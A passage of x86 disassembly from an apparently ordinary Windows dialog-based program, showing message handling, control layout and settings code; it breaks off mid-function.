  402297:	add    al,dl
  402299:	and    al,BYTE PTR [eax+0x0]
  40229c:	add    al,BYTE PTR [eax]
  40229e:	add    BYTE PTR [eax],al
  4022a0:	push   edx
  4022a1:	push   ebx
  4022a2:	inc    esp
  4022a3:	push   ebx
  4022a4:	mov    BYTE PTR [eax],ah
  4022a6:	sub    ecx,edx
  4022a8:	mov    ebx,db1
  4022ab:	inc    eax
  4022ac:	mov    cl,BYTE PTR [eax-0x1]
  4022af:	mov    esp,0x808e5fb6
  4022b4:	add    DWORD PTR [eax],eax
  4022b6:	add    BYTE PTR [eax],al
  4022b8:	gs jae 0x40232b
  4022bb:	gs js  0x402323
  4022be:	cs jo  0x402325
  4022c1:	bound  eax,QWORD PTR [eax]
	...
  4022cf:	add    BYTE PTR [ebx+ebx*2],cl
  4022d2:	add    BYTE PTR [eax],al
  4022d4:	fcomp  DWORD PTR [ebx+0x0]
	...
  4022e3:	add    BYTE PTR [eax],al
  4022e5:	mov    edi,edi
  4022e7:	push   ebp
  4022e8:	mov    ebp,esp
  4022ea:	sub    esp,0x1c
  4022ed:	push   ebx
  4022ee:	push   esi
  4022ef:	xor    ebx,ebx
  4022f1:	push   ebx
  4022f2:	push   ebx
  4022f3:	push   0x1
  4022f5:	push   ebx
  4022f6:	call   DWORD PTR ds:0x40929c
  4022fc:	mov    eax,DWORD PTR [ebp+0x8]
  4022ff:	push   ebx
  402300:	push   0x40239e
  402305:	push   ebx
  402306:	push   0x66
  402308:	push   eax
  402309:	mov    ds:0x4080f4,eax
  40230e:	call   DWORD PTR ds:0x409390
  402314:	push   0x6c
  402316:	push   DWORD PTR ds:0x4080f4
  40231c:	mov    ds:0x408128,eax
  402321:	call   DWORD PTR ds:0x409354
  402327:	mov    esi,eax
  402329:	jmp    0x402358
  40232b:	test   esi,esi
  40232d:	je     0x402344
  40232f:	lea    eax,[ebp-0x1c]
  402332:	push   eax
  402333:	push   esi
  402334:	push   DWORD PTR ds:0x408128
  40233a:	call   DWORD PTR ds:0x409308
  402340:	test   eax,eax
  402342:	jne    0x402358
  402344:	lea    eax,[ebp-0x1c]
  402347:	push   eax
  402348:	call   DWORD PTR ds:0x409368
  40234e:	lea    eax,[ebp-0x1c]
  402351:	push   eax
  402352:	call   DWORD PTR ds:0x40936c
  402358:	push   ebx
  402359:	push   ebx
  40235a:	push   ebx
  40235b:	lea    eax,[ebp-0x1c]
  40235e:	push   eax
  40235f:	call   DWORD PTR ds:0x4093c0
  402365:	test   eax,eax
  402367:	jne    0x40232b
  402369:	push   DWORD PTR ds:0x408128
  40236f:	call   DWORD PTR ds:0x40937c
  402375:	push   esi
  402376:	call   DWORD PTR ds:0x409304
  40237c:	pop    esi
  40237d:	xor    eax,eax
  40237f:	pop    ebx
  402380:	leave  
  402381:	ret    0x10
  402384:	int3   
  402385:	int3   
  402386:	int3   
  402387:	int3   
  402388:	int3   
  402389:	xor    eax,eax
  40238b:	ret    0x4
  40238e:	int3   
  40238f:	int3   
  402390:	int3   
  402391:	int3   
  402392:	int3   
  402393:	ret    0x4
  402396:	int3   
  402397:	int3   
  402398:	int3   
  402399:	int3   
  40239a:	int3   
  40239b:	int3   
  40239c:	int3   
  40239d:	int3   
  40239e:	mov    edi,edi
  4023a0:	push   ebp
  4023a1:	mov    ebp,esp
  4023a3:	sub    esp,0x13c
  4023a9:	mov    eax,ds:0x407a10
  4023ae:	xor    eax,ebp
  4023b0:	mov    DWORD PTR [ebp-0x4],eax
  4023b3:	mov    eax,DWORD PTR [ebp+0xc]
  4023b6:	push   ebx
  4023b7:	push   esi
  4023b8:	push   edi
  4023b9:	mov    edi,DWORD PTR [ebp+0x8]
  4023bc:	mov    ecx,0x111
  4023c1:	mov    DWORD PTR [ebp-0x124],edi
  4023c7:	cmp    eax,ecx
  4023c9:	ja     0x4036a6
  4023cf:	je     0x402a53
  4023d5:	sub    eax,0x5
  4023d8:	je     0x402944
  4023de:	sub    eax,0xa
  4023e1:	je     0x4028a5
  4023e7:	dec    eax
  4023e8:	je     0x40366f
  4023ee:	sub    eax,0x100
  4023f3:	jne    0x403893
  4023f9:	push   0x68
  4023fb:	push   DWORD PTR ds:0x4080f4
  402401:	call   DWORD PTR ds:0x409360
  402407:	mov    ebx,DWORD PTR ds:0x40939c
  40240d:	push   0x3e8
  402412:	push   edi
  402413:	mov    ds:0x407d30,eax
  402418:	mov    DWORD PTR ds:0x408128,edi
  40241e:	call   ebx
  402420:	push   0x3e9
  402425:	push   edi
  402426:	mov    ds:0x408124,eax
  40242b:	call   ebx
  40242d:	push   0x3eb
  402432:	push   edi
  402433:	mov    ds:0x408120,eax
  402438:	call   ebx
  40243a:	push   edi
  40243b:	mov    ds:0x40811c,eax
  402440:	call   DWORD PTR ds:0x409310
  402446:	mov    esi,DWORD PTR ds:0x40930c
  40244c:	push   0x21
  40244e:	mov    ds:0x4080f8,eax
  402453:	call   esi
  402455:	mov    ds:0x407d44,eax
  40245a:	lea    eax,[ebp-0x118]
  402460:	push   eax
  402461:	push   0x3ed
  402466:	push   edi
  402467:	call   ebx
  402469:	push   eax
  40246a:	call   DWORD PTR ds:0x40933c
  402470:	mov    ecx,DWORD PTR ds:0x407d44
  402476:	mov    eax,DWORD PTR [ebp-0x10c]
  40247c:	sub    ecx,DWORD PTR [ebp-0x114]
  402482:	add    eax,0x3
  402485:	add    eax,ecx
  402487:	push   0x2
  402489:	mov    ds:0x407d40,eax
  40248e:	call   esi
  402490:	mov    esi,DWORD PTR ds:0x409318
  402496:	xor    ebx,ebx
  402498:	inc    ebx
  402499:	push   ebx
  40249a:	push   0x9c58
  40249f:	push   DWORD PTR ds:0x4080f8
  4024a5:	add    eax,eax
  4024a7:	xor    edi,edi
  4024a9:	mov    ds:0x407d50,eax
  4024ae:	mov    DWORD PTR ds:0x40813c,edi
  4024b4:	call   esi
  4024b6:	push   ebx
  4024b7:	push   0x9c59
  4024bc:	push   DWORD PTR ds:0x4080f8
  4024c2:	call   esi
  4024c4:	push   0x2
  4024c6:	pop    eax
  4024c7:	mov    ecx,0x4019e0
  4024cc:	mov    DWORD PTR [ebp-0x108],0x20000
  4024d6:	mov    DWORD PTR [ebp-0x104],ecx
  4024dc:	mov    DWORD PTR [ebp-0x100],0x408118
  4024e6:	mov    DWORD PTR [ebp-0xfc],edi
  4024ec:	mov    DWORD PTR [ebp-0xf8],0x4019ec
  4024f6:	mov    DWORD PTR [ebp-0xf4],0x408138
  402500:	mov    DWORD PTR [ebp-0xf0],0x3
  40250a:	mov    DWORD PTR [ebp-0xec],0x4019f8
  402514:	mov    DWORD PTR [ebp-0xe8],0x408114
  40251e:	mov    DWORD PTR [ebp-0xe4],eax
  402524:	mov    DWORD PTR [ebp-0xe0],0x401a04
  40252e:	mov    DWORD PTR [ebp-0xdc],0x408110
  402538:	mov    DWORD PTR [ebp-0xd8],ebx
  40253e:	mov    DWORD PTR [ebp-0xd4],0x401a14
  402548:	mov    DWORD PTR [ebp-0xd0],0x40810c
  402552:	mov    DWORD PTR [ebp-0xcc],eax
  402558:	mov    DWORD PTR [ebp-0xc8],0x401a24
  402562:	mov    DWORD PTR [ebp-0xc4],0x408108
  40256c:	mov    DWORD PTR [ebp-0xc0],ebx
  402572:	mov    DWORD PTR [ebp-0xbc],0x401a30
  40257c:	mov    DWORD PTR [ebp-0xb8],0x408104
  402586:	mov    DWORD PTR [ebp-0xb4],eax
  40258c:	mov    DWORD PTR [ebp-0xb0],0x401a3c
  402596:	mov    DWORD PTR [ebp-0xac],0x408100
  4025a0:	mov    DWORD PTR [ebp-0xa8],edi
  4025a6:	mov    DWORD PTR [ebp-0xa4],0x401a48
  4025b0:	mov    DWORD PTR [ebp-0xa0],0x408134
  4025ba:	mov    DWORD PTR [ebp-0x9c],ebx
  4025c0:	mov    DWORD PTR [ebp-0x98],0x401a54
  4025ca:	mov    DWORD PTR [ebp-0x94],0x4080fc
  4025d4:	mov    DWORD PTR [ebp-0x90],edi
  4025da:	mov    DWORD PTR [ebp-0x8c],edi
  4025e0:	mov    DWORD PTR [ebp-0x88],edi
  4025e6:	mov    DWORD PTR [ebp-0x11c],edi
  4025ec:	mov    esi,edi
  4025ee:	push   DWORD PTR [ebp+esi*1-0x108]
  4025f5:	push   ecx
  4025f6:	push   0x407a00
  4025fb:	call   DWORD PTR ds:0x409284
  402601:	mov    ecx,DWORD PTR [ebp+esi*1-0x100]
  402608:	mov    DWORD PTR [ecx],eax
  40260a:	mov    eax,DWORD PTR [ebp-0x11c]
  402610:	inc    eax
  402611:	mov    esi,eax
  402613:	imul   esi,esi,0xc
  402616:	mov    ecx,DWORD PTR [ebp+esi*1-0x104]
  40261d:	mov    DWORD PTR [ebp-0x11c],eax
  402623:	test   ecx,ecx
  402625:	jne    0x4025ee
  402627:	mov    esi,edi
  402629:	mov    eax,ebx
  40262b:	mov    ecx,esi
  40262d:	shl    eax,cl
  40262f:	test   DWORD PTR ds:0x408104,eax
  402635:	je     0x40264c
  402637:	push   0x8
  402639:	lea    eax,[esi+0x9c42]
  40263f:	push   eax
  402640:	push   DWORD PTR ds:0x4080f8
  402646:	call   DWORD PTR ds:0x409314
  40264c:	inc    esi
  40264d:	cmp    esi,0x6
  402650:	jb     0x402629
  402652:	mov    eax,ds:0x408100
  402657:	push   0x8
  402659:	add    eax,0x9c51
  40265e:	push   eax
  40265f:	push   DWORD PTR ds:0x4080f8
  402665:	call   DWORD PTR ds:0x409314
  40266b:	mov    eax,ds:0x408138
  402670:	mov    esi,DWORD PTR ds:0x409314
  402676:	neg    eax
  402678:	sbb    eax,eax
  40267a:	and    eax,0x8
  40267d:	push   eax
  40267e:	push   0x9c4c
  402683:	push   DWORD PTR ds:0x4080f8
  402689:	call   esi
  40268b:	mov    eax,ds:0x4080fc
  402690:	neg    eax
  402692:	sbb    eax,eax
  402694:	and    eax,0x8
  402697:	push   eax
  402698:	push   0x9c5a
  40269d:	push   DWORD PTR ds:0x4080f8
  4026a3:	call   esi
  4026a5:	mov    eax,ds:0x408134
  4026aa:	neg    eax
  4026ac:	sbb    eax,eax
  4026ae:	and    eax,0x8
  4026b1:	push   eax
  4026b2:	push   0x9c56
  4026b7:	push   DWORD PTR ds:0x4080f8
  4026bd:	call   esi
  4026bf:	mov    esi,DWORD PTR [ebp-0x124]
  4026c5:	push   0x3ed
  4026ca:	push   esi
  4026cb:	call   DWORD PTR ds:0x40939c
  4026d1:	push   0x401a6c
  4026d6:	push   0x22
  4026d8:	push   ebx
  4026d9:	push   0x2
  4026db:	push   ebx
  4026dc:	push   edi
  4026dd:	push   edi
  4026de:	push   edi
  4026df:	push   edi
  4026e0:	push   0x190
  4026e5:	push   edi
  4026e6:	push   edi
  4026e7:	push   0x5
  4026e9:	push   0xd
  4026eb:	mov    esi,eax
  4026ed:	call   DWORD PTR ds:0x409258
  4026f3:	mov    ds:0x407d54,eax
  4026f8:	push   edi
  4026f9:	push   eax
  4026fa:	push   0x30
  4026fc:	push   esi
  4026fd:	call   DWORD PTR ds:0x409370
  402703:	push   0x2
  402705:	push   esi
  402706:	call   DWORD PTR ds:0x409358
  40270c:	mov    esi,eax
  40270e:	test   esi,esi
  402710:	je     0x402719
  402712:	mov    eax,ds:0x407d54
  402717:	jmp    0x4026f8
  402719:	mov    esi,DWORD PTR ds:0x409284
  40271f:	push   0x64
  402721:	push   0x401a7c
  402726:	push   0x407a00
  40272b:	call   esi
  40272d:	push   0x19
  40272f:	push   0x401a84
  402734:	push   0x407a00
  402739:	mov    ds:0x40812c,eax
  40273e:	call   esi
  402740:	push   0x3f
  402742:	mov    ds:0x408130,eax
  402747:	lea    eax,[ebp-0x74]
  40274a:	push   eax
  40274b:	push   0x40104c
  402750:	push   0x401a8c
  402755:	push   0x407a00
  40275a:	call   DWORD PTR ds:0x409288
  402760:	push   0x4
  402762:	lea    eax,[ebp-0x74]
  402765:	push   0x401a94
  40276a:	push   eax
  40276b:	call   0x405b36
  402770:	mov    esi,DWORD PTR [ebp-0x124]
  402776:	add    esp,0xc
  402779:	test   eax,eax
  40277b:	jne    0x402781
  40277d:	push   0x3
  40277f:	jmp    0x40279a
  402781:	push   0x4
  402783:	lea    eax,[ebp-0x74]
  402786:	push   0x401a98
  40278b:	push   eax
  40278c:	call   0x405b36
  402791:	add    esp,0xc
  402794:	test   eax,eax
  402796:	jne    0x4027a6
  402798:	push   0x2
  40279a:	push   esi
  40279b:	call   DWORD PTR ds:0x409380
  4027a1:	jmp    0x402879
  4027a6:	push   edi
  4027a7:	call   DWORD PTR ds:0x40930c
  4027ad:	push   ebx
  4027ae:	mov    esi,eax
  4027b0:	call   DWORD PTR ds:0x40930c
  4027b6:	push   edi
  4027b7:	push   0x401a8c
  4027bc:	mov    edi,0x407a00
  4027c1:	push   edi
  4027c2:	mov    ebx,eax
  4027c4:	call   DWORD PTR ds:0x409284
  4027ca:	mov    DWORD PTR [ebp-0x120],eax
  4027d0:	mov    eax,ebx
  4027d2:	imul   eax,eax,0x3
  4027d5:	cdq    
  4027d6:	and    edx,0x3
  4027d9:	add    eax,edx
  4027db:	sar    eax,0x2
  4027de:	push   eax
  4027df:	push   0x401a9c
  4027e4:	push   edi
  4027e5:	call   DWORD PTR ds:0x409284
  4027eb:	push   esi
  4027ec:	push   0x401aa0
  4027f1:	push   0x407a00
  4027f6:	mov    edi,eax
  4027f8:	call   DWORD PTR ds:0x409284
  4027fe:	push   ebx
  4027ff:	push   0x401aa8
  402804:	push   0x407a00
  402809:	mov    esi,eax
  40280b:	call   DWORD PTR ds:0x409284
  402811:	mov    ebx,DWORD PTR [ebp-0x124]
  402817:	push   0x40
  402819:	sub    eax,edi
  40281b:	push   eax
  40281c:	mov    eax,DWORD PTR [ebp-0x120]
  402822:	sub    esi,eax
  402824:	push   esi
  402825:	push   edi
  402826:	push   eax
  402827:	xor    edi,edi
  402829:	push   edi
  40282a:	push   ebx
  40282b:	call   DWORD PTR ds:0x409388
  402831:	lea    eax,[ebp-0x118]
  402837:	push   eax
  402838:	push   ebx
  402839:	call   DWORD PTR ds:0x409338
  40283f:	mov    eax,DWORD PTR [ebp-0x10c]
  402845:	sub    eax,DWORD PTR [ebp-0x114]
  40284b:	movzx  ecx,ax
  40284e:	mov    eax,DWORD PTR [ebp-0x110]
  402854:	sub    eax,DWORD PTR [ebp-0x118]
  40285a:	shl    ecx,0x10
  40285d:	movzx  eax,ax
  402860:	or     ecx,eax
  402862:	push   ecx
  402863:	push   edi
  402864:	push   0x5
  402866:	push   ebx
  402867:	call   DWORD PTR ds:0x409370
  40286d:	push   0x5
  40286f:	push   ebx
  402870:	call   DWORD PTR ds:0x409380
  402876:	xor    ebx,ebx
  402878:	inc    ebx
  402879:	lea    eax,[ebp-0x128]
  40287f:	push   eax
  402880:	push   edi
  402881:	push   edi
  402882:	push   0x405158
  402887:	push   edi
  402888:	push   edi
  402889:	call   DWORD PTR ds:0x409278
  40288f:	mov    esi,eax
  402891:	push   ebx
  402892:	push   esi
  402893:	call   DWORD PTR ds:0x409264
  402899:	push   esi
  40289a:	call   DWORD PTR ds:0x4092a8
  4028a0:	jmp    0x403893
  4028a5:	lea    eax,[ebp-0x74]
  4028a8:	push   eax
  4028a9:	push   edi
  4028aa:	call   DWORD PTR ds:0x409320
  4028b0:	push   edi
  4028b1:	call   DWORD PTR ds:0x40938c
  4028b7:	test   eax,eax
  4028b9:	je     0x4028d4
  4028bb:	mov    eax,ds:0x407d30
  4028c0:	test   eax,eax
  4028c2:	je     0x402934
  4028c4:	push   eax
  4028c5:	xor    eax,eax
  4028c7:	push   eax
  4028c8:	push   eax
  4028c9:	push   DWORD PTR [ebp-0x74]
  4028cc:	call   DWORD PTR ds:0x40931c
  4028d2:	jmp    0x402934
  4028d4:	push   0x1
  4028d6:	call   DWORD PTR ds:0x409250
  4028dc:	push   eax
  4028dd:	lea    eax,[ebp-0x6c]
  4028e0:	push   eax
  4028e1:	push   DWORD PTR [ebp-0x74]
  4028e4:	call   DWORD PTR ds:0x409350
  4028ea:	mov    esi,DWORD PTR ds:0x40925c
  4028f0:	xor    ebx,ebx
  4028f2:	push   ebx
  4028f3:	push   ebx
  4028f4:	push   ebx
  4028f5:	push   DWORD PTR [ebp-0x74]
  4028f8:	call   esi
  4028fa:	mov    edi,DWORD PTR ds:0x40924c
  402900:	push   ebx
  402901:	push   0x1388
  402906:	push   DWORD PTR [ebp-0x74]
  402909:	call   edi
  40290b:	mov    eax,ds:0x407d40
  402910:	push   ebx
  402911:	add    eax,0xfffffffc
  402914:	push   eax
  402915:	push   ebx
  402916:	push   DWORD PTR [ebp-0x74]
  402919:	call   esi
  40291b:	mov    eax,ds:0x407d40
  402920:	add    eax,0xfffffffc
  402923:	push   eax
  402924:	push   0x1388
  402929:	push   DWORD PTR [ebp-0x74]
  40292c:	call   edi
  40292e:	mov    edi,DWORD PTR [ebp-0x124]
  402934:	lea    eax,[ebp-0x74]
  402937:	push   eax
  402938:	push   edi
  402939:	call   DWORD PTR ds:0x409324
  40293f:	jmp    0x403893
  402944:	cmp    DWORD PTR [ebp+0x10],0x1
  402948:	je     0x403893
  40294e:	mov    edi,DWORD PTR [ebp+0x14]
  402951:	mov    ecx,DWORD PTR ds:0x40812c
  402957:	movzx  ebx,di
  40295a:	mov    DWORD PTR [ebp-0x120],ebx
  402960:	test   ecx,ecx
  402962:	jne    0x402965
  402964:	inc    ecx
  402965:	mov    eax,ebx
  402967:	imul   eax,DWORD PTR ds:0x408130
  40296e:	cdq    
  40296f:	idiv   ecx
  402971:	mov    ecx,DWORD PTR ds:0x407d40
  402977:	push   0x40
  402979:	push   0x3
  40297b:	shr    edi,0x10
  40297e:	sub    edi,ecx
  402980:	mov    DWORD PTR ds:0x40812c,ebx
  402986:	pop    ebx
  402987:	mov    DWORD PTR ds:0x407d48,edi
  40298d:	mov    esi,eax
  40298f:	lea    eax,[edi+edi*1]
  402992:	cdq    
  402993:	idiv   ebx
  402995:	mov    DWORD PTR ds:0x408130,esi
  40299b:	push   eax
  40299c:	push   esi
  40299d:	push   ecx
  40299e:	push   0x0
  4029a0:	push   ebx
  4029a1:	push   DWORD PTR ds:0x408124
  4029a7:	mov    ebx,DWORD PTR ds:0x409358
  4029ad:	call   ebx
  4029af:	mov    edi,DWORD PTR ds:0x409388
  4029b5:	push   eax
  4029b6:	push   DWORD PTR ds:0x408124
  4029bc:	call   edi
  4029be:	mov    ecx,DWORD PTR ds:0x407d48
  4029c4:	push   0x40
  4029c6:	push   0x3
  4029c8:	pop    esi
  4029c9:	mov    eax,ecx
  4029cb:	cdq    
  4029cc:	idiv   esi
  4029ce:	mov    esi,DWORD PTR ds:0x407d44
  4029d4:	sub    eax,esi
  4029d6:	push   eax
  4029d7:	push   DWORD PTR ds:0x408130
  4029dd:	lea    eax,[ecx+ecx*1]
  4029e0:	push   0x3
  4029e2:	pop    ecx
  4029e3:	cdq    
  4029e4:	idiv   ecx
  4029e6:	add    eax,DWORD PTR ds:0x407d40
  4029ec:	add    eax,esi
  4029ee:	push   eax
  4029ef:	xor    esi,esi
  4029f1:	push   esi
  4029f2:	push   ecx
  4029f3:	push   DWORD PTR ds:0x408120
  4029f9:	call   ebx
  4029fb:	push   eax
  4029fc:	push   DWORD PTR ds:0x408120
  402a02:	call   edi
  402a04:	mov    ecx,DWORD PTR ds:0x408130
  402a0a:	mov    edx,DWORD PTR [ebp-0x120]
  402a10:	mov    eax,ds:0x407d44
  402a15:	push   0x40
  402a17:	push   DWORD PTR ds:0x407d48
  402a1d:	sub    edx,ecx
  402a1f:	sub    edx,eax
  402a21:	push   edx
  402a22:	push   DWORD PTR ds:0x407d40
  402a28:	add    eax,ecx
  402a2a:	push   eax
  402a2b:	push   0x3
  402a2d:	push   DWORD PTR ds:0x40811c
  402a33:	call   ebx
  402a35:	push   eax
  402a36:	push   DWORD PTR ds:0x40811c
  402a3c:	call   edi
  402a3e:	push   0x1
  402a40:	push   esi
  402a41:	mov    esi,DWORD PTR [ebp-0x124]
  402a47:	push   esi
  402a48:	call   DWORD PTR ds:0x409328
  402a4e:	jmp    0x403893
  402a53:	mov    eax,DWORD PTR [ebp+0x10]
  402a56:	movzx  ebx,ax
  402a59:	mov    ecx,0x9c40
  402a5e:	mov    DWORD PTR [ebp-0x120],ebx
  402a64:	cmp    ebx,ecx
  402a66:	ja     0x403088
  402a6c:	je     0x403079
  402a72:	add    ebx,0xfffffc18
  402a78:	cmp    ebx,0xe
  402a7b:	ja     0x403893
  402a81:	push   0x2
  402a83:	pop    esi
  402a84:	jmp    DWORD PTR [ebx*4+0x4038a6]
  402a8b:	xor    ebx,ebx
  402a8d:	push   ebx
  402a8e:	push   ebx
  402a8f:	push   0x188
  402a94:	push   DWORD PTR ds:0x408124
  402a9a:	xor    esi,esi
  402a9c:	inc    esi
  402a9d:	lea    eax,[ebp-0xe4]
  402aa3:	mov    DWORD PTR [ebp-0xe4],0x401d58
  402aad:	mov    DWORD PTR [ebp-0xe0],esi
  402ab3:	mov    DWORD PTR [ebp-0xdc],ebx
  402ab9:	mov    DWORD PTR [ebp-0xd8],ebx
  402abf:	mov    DWORD PTR [ebp-0xd4],0x401d60
  402ac9:	mov    DWORD PTR [ebp-0xd0],esi
  402acf:	mov    DWORD PTR [ebp-0xcc],ebx
  402ad5:	mov    DWORD PTR [ebp-0xc8],ebx
  402adb:	mov    DWORD PTR [ebp-0xc4],0x401d68
  402ae5:	mov    DWORD PTR [ebp-0xc0],0x4
  402aef:	mov    DWORD PTR [ebp-0xbc],ebx
  402af5:	mov    DWORD PTR [ebp-0xb8],0x407900
  402aff:	mov    DWORD PTR [ebp-0xb4],0x401d70
  402b09:	mov    DWORD PTR [ebp-0xb0],esi
  402b0f:	mov    DWORD PTR [ebp-0xac],ebx
  402b15:	mov    DWORD PTR [ebp-0xa8],ebx
  402b1b:	mov    DWORD PTR [ebp-0xa4],0x401d7c
  402b25:	mov    DWORD PTR [ebp-0xa0],esi
  402b2b:	mov    DWORD PTR [ebp-0x9c],ebx
  402b31:	mov    DWORD PTR [ebp-0x98],ebx
  402b37:	mov    DWORD PTR [ebp-0x94],0x401d88
  402b41:	mov    DWORD PTR [ebp-0x90],esi
  402b47:	mov    DWORD PTR [ebp-0x8c],ebx
  402b4d:	mov    DWORD PTR [ebp-0x88],ebx
  402b53:	mov    DWORD PTR [ebp-0x118],0x6
  402b5d:	mov    DWORD PTR [ebp-0x114],0x401d94
  402b67:	mov    DWORD PTR [ebp-0x110],ebx
  402b6d:	mov    DWORD PTR [ebp-0x10c],eax
  402b73:	call   DWORD PTR ds:0x409370
  402b79:	cmp    eax,0xffffffff
  402b7c:	je     0x402bc3
  402b7e:	push   ebx
  402b7f:	push   eax
  402b80:	push   0x199
  402b85:	push   DWORD PTR ds:0x408124
  402b8b:	call   DWORD PTR ds:0x409370
  402b91:	mov    ecx,eax
  402b93:	cmp    DWORD PTR [ecx+0x4],ebx
  402b96:	je     0x402bb4
  402b98:	cmp    DWORD PTR [ecx+0x4],esi
  402b9b:	jne    0x402bc3
  402b9d:	mov    eax,DWORD PTR [ecx+0xc]
  402ba0:	mov    DWORD PTR [ebp-0xc8],eax
  402ba6:	mov    DWORD PTR [ebp-0xcc],eax
  402bac:	mov    ecx,DWORD PTR [ecx+0x18]
  402baf:	cmp    DWORD PTR [ecx+0x4],ebx
  402bb2:	jne    0x402bac
  402bb4:	mov    eax,DWORD PTR [ecx+0xc]
  402bb7:	mov    DWORD PTR [ebp-0xdc],eax
  402bbd:	mov    DWORD PTR [ebp-0xd8],eax
  402bc3:	lea    eax,[ebp-0x118]
  402bc9:	push   eax
  402bca:	push   0x404608
  402bcf:	push   edi
  402bd0:	push   0x69
  402bd2:	push   DWORD PTR ds:0x4080f4
  402bd8:	call   DWORD PTR ds:0x409394
  402bde:	cmp    eax,esi
  402be0:	jne    0x403893
  402be6:	push   DWORD PTR [ebp-0x8c]
  402bec:	push   DWORD PTR [ebp-0x9c]
  402bf2:	push   DWORD PTR [ebp-0xac]
  402bf8:	push   DWORD PTR [ebp-0xbc]
  402bfe:	push   DWORD PTR [ebp-0xcc]
  402c04:	push   DWORD PTR [ebp-0xdc]
  402c0a:	call   0x405652
  402c0f:	jmp    0x403893
  402c14:	xor    ebx,ebx
  402c16:	push   ebx
  402c17:	push   ebx
  402c18:	push   0x188
  402c1d:	push   DWORD PTR ds:0x408124
  402c23:	xor    esi,esi
  402c25:	inc    esi
  402c26:	lea    eax,[ebp-0x84]
  402c2c:	mov    DWORD PTR [ebp-0x84],0x401da0
  402c36:	mov    DWORD PTR [ebp-0x80],esi
  402c39:	mov    DWORD PTR [ebp-0x7c],ebx
  402c3c:	mov    DWORD PTR [ebp-0x78],ebx
  402c3f:	mov    DWORD PTR [ebp-0x74],0x401d68
  402c46:	mov    DWORD PTR [ebp-0x70],0x4
  402c4d:	mov    DWORD PTR [ebp-0x6c],ebx
  402c50:	mov    DWORD PTR [ebp-0x68],0x407988
  402c57:	mov    DWORD PTR [ebp-0x64],0x401d70
  402c5e:	mov    DWORD PTR [ebp-0x60],esi
  402c61:	mov    DWORD PTR [ebp-0x5c],ebx
  402c64:	mov    DWORD PTR [ebp-0x58],ebx
  402c67:	mov    DWORD PTR [ebp-0x54],0x401d7c
  402c6e:	mov    DWORD PTR [ebp-0x50],esi
  402c71:	mov    DWORD PTR [ebp-0x4c],ebx
  402c74:	mov    DWORD PTR [ebp-0x48],ebx
  402c77:	mov    DWORD PTR [ebp-0x44],0x401d88
  402c7e:	mov    DWORD PTR [ebp-0x40],esi
  402c81:	mov    DWORD PTR [ebp-0x3c],ebx
  402c84:	mov    DWORD PTR [ebp-0x38],ebx
  402c87:	mov    DWORD PTR [ebp-0x118],0x5
  402c91:	mov    DWORD PTR [ebp-0x114],0x401da8
  402c9b:	mov    DWORD PTR [ebp-0x110],ebx
  402ca1:	mov    DWORD PTR [ebp-0x10c],eax
  402ca7:	call   DWORD PTR ds:0x409370
  402cad:	cmp    eax,0xffffffff
  402cb0:	je     0x402cd4
  402cb2:	push   ebx
  402cb3:	push   eax
  402cb4:	push   0x199
  402cb9:	push   DWORD PTR ds:0x408124
  402cbf:	call   DWORD PTR ds:0x409370
  402cc5:	cmp    DWORD PTR [eax+0x4],0x2
  402cc9:	jne    0x402cd4
  402ccb:	mov    eax,DWORD PTR [eax+0xc]
  402cce:	mov    DWORD PTR [ebp-0x78],eax
  402cd1:	mov    DWORD PTR [ebp-0x7c],eax
  402cd4:	lea    eax,[ebp-0x118]
  402cda:	push   eax
  402cdb:	push   0x404608
  402ce0:	push   edi
  402ce1:	push   0x69
  402ce3:	push   DWORD PTR ds:0x4080f4
  402ce9:	call   DWORD PTR ds:0x409394
  402cef:	cmp    eax,esi
  402cf1:	jne    0x403893
  402cf7:	push   DWORD PTR [ebp-0x3c]
  402cfa:	push   DWORD PTR [ebp-0x4c]
  402cfd:	push   DWORD PTR [ebp-0x5c]
  402d00:	push   DWORD PTR [ebp-0x6c]
  402d03:	push   ebx
  402d04:	push   DWORD PTR [ebp-0x7c]
  402d07:	jmp    0x402c0a
  402d0c:	call   DWORD PTR ds:0x4093b0
  402d12:	mov    ecx,DWORD PTR ds:0x408124
  402d18:	cmp    eax,ecx
  402d1a:	je     0x402d41
  402d1c:	mov    ecx,DWORD PTR ds:0x408120
  402d22:	cmp    eax,ecx
  402d24:	je     0x402ec6
  402d2a:	jmp    0x403893
  402d2f:	shr    eax,0x10
  402d32:	cmp    ax,si
  402d35:	jne    0x403893
  402d3b:	mov    ecx,DWORD PTR ds:0x408124
  402d41:	xor    ebx,ebx
  402d43:	push   ebx
  402d44:	push   ebx
  402d45:	push   0x188
  402d4a:	push   ecx
  402d4b:	call   DWORD PTR ds:0x409370
  402d51:	cmp    eax,0xffffffff
  402d54:	je     0x403893
  402d5a:	push   ebx
  402d5b:	push   eax
  402d5c:	push   0x199
  402d61:	push   DWORD PTR ds:0x408124
  402d67:	call   DWORD PTR ds:0x409370
  402d6d:	mov    ecx,eax
  402d6f:	mov    eax,DWORD PTR [ecx+0x4]
  402d72:	mov    DWORD PTR [ebp-0x120],ecx
  402d78:	sub    eax,ebx
  402d7a:	je     0x402e3e
  402d80:	dec    eax
  402d81:	je     0x402d96
  402d83:	dec    eax
  402d84:	jne    0x403893
  402d8a:	push   DWORD PTR [ecx]
  402d8c:	push   0x401e10
  402d91:	jmp    0x402e45
  402d96:	mov    eax,DWORD PTR [ecx+0x10]
  402d99:	push   DWORD PTR [ecx+0x8]
  402d9c:	mov    DWORD PTR [ebp-0x4c],eax
  402d9f:	lea    eax,[ebp-0x24]
  402da2:	mov    DWORD PTR [ebp-0x114],eax
  402da8:	lea    eax,[ebp-0x54]
  402dab:	push   0x401dfc
  402db0:	mov    DWORD PTR [ebp-0x10c],eax
  402db6:	lea    eax,[ebp-0x24]
  402db9:	push   0x20
  402dbb:	push   eax
  402dbc:	mov    DWORD PTR [ebp-0x54],0x401de0
  402dc3:	mov    DWORD PTR [ebp-0x50],0x4
  402dca:	mov    DWORD PTR [ebp-0x48],0x4070b0
  402dd1:	mov    DWORD PTR [ebp-0x44],0x401dec
  402dd8:	mov    DWORD PTR [ebp-0x40],0x1
  402ddf:	mov    DWORD PTR [ebp-0x3c],ebx
  402de2:	mov    DWORD PTR [ebp-0x38],ebx
  402de5:	mov    DWORD PTR [ebp-0x118],esi
  402deb:	mov    DWORD PTR [ebp-0x110],ebx
  402df1:	call   0x405110
  402df6:	add    esp,0x10
  402df9:	lea    eax,[ebp-0x118]
  402dff:	push   eax
  402e00:	push   0x404608
  402e05:	push   edi
  402e06:	push   0x69
  402e08:	push   DWORD PTR ds:0x4080f4
  402e0e:	call   DWORD PTR ds:0x409394
  402e14:	cmp    eax,0x1
